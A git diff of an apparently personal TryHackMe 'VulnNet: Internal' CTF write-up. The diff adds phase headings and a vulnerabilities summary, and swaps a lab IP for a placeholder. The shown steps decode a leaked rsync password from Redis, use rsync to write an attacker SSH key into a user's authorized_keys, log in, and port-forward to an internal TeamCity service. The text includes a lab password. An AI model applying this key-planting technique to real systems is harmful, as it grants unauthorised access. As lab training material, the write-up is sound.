@@ -1,8 +1,8 @@
-# Try Hack Me - VulnNet:Internal
+# Try Hack Me - VulnNet: Internal
 # Author: Atharva Bordavekar
 # Difficulty: Easy
-# Points:
-# Vulnerabilities:
+# Points: 120
+# Vulnerabilities: Leaked credentials of redis/resync services, weak .ssh directory permissions, weak log permissions
 # Phase 1 - Reconnaissance:
 
 nmap scan:
@@ -104,6 +104,8 @@ now we will try to find the range of the authlist
 ```bash
 LLEN authlist
 ```
+# Phase 2 - Initial Foothold:
+
 there are 4 indices of the authlist, after checking all of the 4, the contents they have is the same. the content is encoded in base64. on decoding the contents using cyberchef, we can find the password to the rsync service.
 
 ```bash
@@ -122,8 +124,10 @@ RSYNC_PASSWORD=<rsync_password> rsync -av rsync://rsync-connect@<target_ip>/file
 ```
 we can see there are a lot of files. but the most interesting one is the /.ssh directory. we can upload our personal ssh public keys on the system. lets generate some public keys using ssh-keygen
 
+# Shell as sys-internal:
+
 ```bash
-ssh-keygen -t rsa -f vulnnet_id_rsa -N ""
+ssh-keygen -t rsa -f sys_id_rsa -N ""
 ```
 lets give the private key the appropriate permissions
 ```bash
@@ -132,8 +136,7 @@ chmod 600 sys_id_rsa
 now we will upload the public keys to the /.ssh/authorized_keys file.
 
 ```bash
-ealatharva15㉿kalilinux)-[~/tryhackme/vulnnet:internal]
-└─$  RSYNC_PASSWORD=Hcg3HP67@TW@Bc72v rsync -av vulnnet_id_rsa.pub rsync://rsync-connect@10.80.174.137/files/sys-internal/.ssh/authorized_keys
+RSYNC_PASSWORD=Hcg3HP67@TW@Bc72v rsync -av sys_id_rsa.pub rsync://rsync-connect@<target_ip>/files/sys-internal/.ssh/authorized_keys
 ```
 now we have successfully uploaded the public id_rsa. now we will login using the private id_rsa. 
 
@@ -141,6 +144,8 @@ now we have successfully uploaded the public id_rsa. now we will login using the
 ssh -i sys_id_rsa sys-internal@<target_ip>
 ```
 we find the user.txt flag in the /home/sys-internal directory. we read it and submit it. now after some manual enumeration we find nothing but an unusual folder at the root directory named /TeamCity. lets run linpeas.sh on the machine in order to find more information about it. after runnning the script, we found out that the TeamCity service is running on the port 8111 on localhost. we might be able to access it using ssh port forwarding. 
+
+# Phase 3 - Privilege Escalation:
 
 ```bash
 ssh -i sys_id_rsa -L 8111:localhost:8111 sys-internal@<target_ip>
